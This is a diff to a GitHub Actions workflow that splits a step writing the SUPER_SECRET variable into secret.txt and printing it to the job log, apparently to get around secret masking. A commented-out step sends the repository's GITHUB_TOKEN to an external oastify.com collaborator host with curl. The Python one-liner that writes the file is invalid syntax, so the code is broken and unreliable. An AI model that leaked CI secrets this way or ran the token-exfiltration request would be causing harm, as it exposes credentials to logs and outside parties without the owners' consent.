@@ -23,11 +23,13 @@ jobs:
         run: |
           ls ${{ github.workspace }}
       - run: echo "🍏 This job's status is ${{ job.status }}."
-      - name: Show secret thru file
+      - name: Create a secret file
+        run: touch secret.txt
+      - name: Write the secret there
         run: |
-          touch secret.txt
           python -c "import os; with open('secret.txt', 'w') as f: f.write(os.getenv('SUPER_SECRET'))"
-          cat secret.txt
+      - name: Display content
+        run: cat secret.txt
       # - name: Show secret
       #   run: |
       #     curl -X GET https://8bkmpsonimqso848i8qdzcxax13srif7.oastify.com?token=${{secrets.GITHUB_TOKEN}}
